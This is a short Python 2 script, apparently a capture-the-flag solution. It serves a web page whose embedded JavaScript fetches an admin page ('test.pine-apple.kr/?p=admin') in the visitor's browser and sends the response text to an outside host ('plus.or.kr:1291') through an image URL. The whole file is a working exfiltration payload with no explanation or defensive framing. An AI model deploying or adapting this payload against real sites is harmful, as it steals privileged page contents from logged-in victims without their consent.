#!/usr/bin/env python

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import SocketServer


class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')

    def do_GET(self):
        self._set_headers()
        self.wfile.write('''
<img id='test'>

<script>
var req = new XMLHttpRequest();
req.open('GET', 'http://test.pine-apple.kr/?p=admin', false);
req.send(null);
if(req.status == 200)
  document.getElementById('test').src = 'http://plus.or.kr:1291/?c='+req.responseText;
</script>''')


def run(server_class=HTTPServer, handler_class=S, port=5050):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print 'Starting httpd...'
    httpd.serve_forever()

if __name__ == "__main__":
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
